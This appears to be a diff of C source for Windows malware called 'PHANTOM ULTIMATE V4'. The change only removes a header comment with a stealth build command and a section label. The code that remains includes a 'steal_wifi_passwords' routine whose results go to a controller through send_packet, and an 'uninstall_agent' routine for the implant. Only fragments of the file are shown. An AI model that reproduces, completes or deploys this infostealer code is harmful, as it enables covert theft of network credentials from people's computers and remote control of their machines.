@@ -1,13 +1,4 @@
-/**
- * ============================================================================
- * PHANTOM ULTIMATE V4 - COMPLETE FIXED VERSION
- * ============================================================================
- * 
- * COMPILE:
- *   gcc -o phantom.exe phantom_fixed.c -lws2_32 -lgdi32 -luser32 -ladvapi32 
- *   -lshell32 -liphlpapi -lpsapi -lwinhttp -lcrypt32 -lbcrypt -lrpcrt4 -lole32 -O2 -s -mwindows
- * ============================================================================
- */
+
 
 #define _CRT_SECURE_NO_WARNINGS
 #define WIN32_LEAN_AND_MEAN
@@ -524,10 +515,6 @@ static void steal_wifi_passwords(void) {
     
     send_packet(CMD_WIFI, (unsigned char*)result, offset);
 }
-
-/* ============================================================================
- * UNINSTALL
- * ============================================================================ */
 
 static void uninstall_agent(void) {
     send_packet(CMD_UNINSTALL, (unsigned char*)"BYE", 3);
